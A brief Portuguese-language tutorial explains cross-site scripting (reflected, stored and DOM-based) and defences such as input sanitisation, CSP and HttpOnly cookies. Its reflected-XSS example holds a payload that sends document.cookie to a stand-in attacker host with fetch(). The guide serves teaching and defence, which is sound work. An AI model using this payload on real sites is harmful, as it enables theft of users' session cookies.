# 💉 XSS (Cross-Site Scripting): Executando Scripts no Alvo

O XSS ocorre quando um atacante consegue injetar código JavaScript malicioso em uma página legítima, que será executado no navegador da vítima.

## 🚀 Como funciona na prática?
Imagine um campo de "Comentários" que não limpa o que o usuário digita. Se você digitar `<script>alert('Hackeado!')</script>`, qualquer um que ler seu comentário verá o alerta.

## 👺 Os 3 Tipos de Ataque

### 1. 📬 XSS Refletido (Reflected)
O ataque é "bate e volta". O script está em um link malicioso.
- **Exemplo**: `http://site.com/busca?q=<script>fetch('http://atacker.com?c=' + document.cookie)</script>`
- **Cenário**: O atacante envia esse link para a vítima por e-mail. Ao clicar, o cookie da vítima é enviado para o servidor do atacante.

### 2. 💾 XSS Armazenado (Stored) - O Mais Perigoso!
O script fica salvo no Banco de Dados do site.
- **Cenário**: Você posta um comentário malicioso em um fórum. **Todos** os usuários que entrarem naquele post terão seus dados roubados automaticamente.

### 3. 🌳 XSS Baseado em DOM
Acontece totalmente no navegador, manipulando a estrutura da página (DOM) via JavaScript, sem necessariamente passar pelo servidor.

## 🛡️ Defesa Cibernética
1. **Sanitização**: Nunca confie no input do usuário. Filtre `<>`, `script`, etc.
2. **CSP (Content Security Policy)**: Uma regra que diz ao navegador: "Só aceite scripts vindos do MEU servidor".
3. **HttpOnly Cookies**: Impede que o JavaScript acesse os cookies, anulando o roubo de sessão via XSS.

---
**Tags:** `JavaScript`, `Injeção`, `Payloads`, `Stored-XSS`, `Reflected-XSS`, `Mitigação`